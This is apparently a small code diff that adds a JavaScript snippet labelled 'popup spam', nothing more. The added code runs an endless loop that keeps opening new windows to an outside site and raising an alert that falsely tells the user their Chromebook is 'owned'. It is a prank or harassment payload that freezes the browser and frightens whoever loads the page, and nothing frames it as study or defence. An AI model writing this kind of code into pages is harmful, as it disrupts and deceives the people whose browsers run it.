@@ -1,0 +1,5 @@
+// popup spam
+while (true) {
+    window.open('http://lolz.site', '_blank');
+    alert('YOUR CHROMEBOOK IS OWNED, LOL! :)');
+}
